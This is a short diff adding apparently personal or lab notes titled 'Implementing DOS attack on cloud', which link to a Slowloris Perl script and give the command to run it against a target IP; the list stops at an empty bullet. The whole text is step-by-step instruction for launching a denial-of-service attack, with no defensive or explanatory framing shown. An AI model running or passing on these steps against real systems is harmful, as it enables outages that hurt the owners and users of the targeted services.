@@ -1,0 +1,5 @@
+* Implementing DOS attack on cloud:
+    - Get the script here -> https://github.com/mattiasgeniar/slowloris/blob/master/slowloris.pl
+    - Run the command shown below:
+        # ./slowloris.pl -dns <target_ip>
+    - 
